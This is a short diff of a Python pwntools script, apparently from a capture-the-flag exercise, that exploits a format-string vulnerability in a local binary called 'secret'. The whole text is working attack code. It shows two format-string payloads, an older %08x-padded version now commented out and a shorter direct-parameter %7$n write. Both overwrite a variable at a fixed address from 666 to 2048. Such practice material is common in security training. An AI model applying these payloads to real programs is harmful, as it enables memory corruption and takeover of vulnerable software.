@@ -4,6 +4,7 @@ from pwn import *
 p = process('secret')
 secret = 0x804a028
 # change secret@0x804a028 666 -> 2048
-payload = p32(secret) + "%08x.%08x.%08x.%08x.%08x.%01998x.%n"
+# payload = p32(secret) + "%08x.%08x.%08x.%08x.%08x.%01998x.%n"
+payload = p32(secret) + "%2043x.%7$n"
 p.sendline(payload)
 print p.read().split('.')[-1]
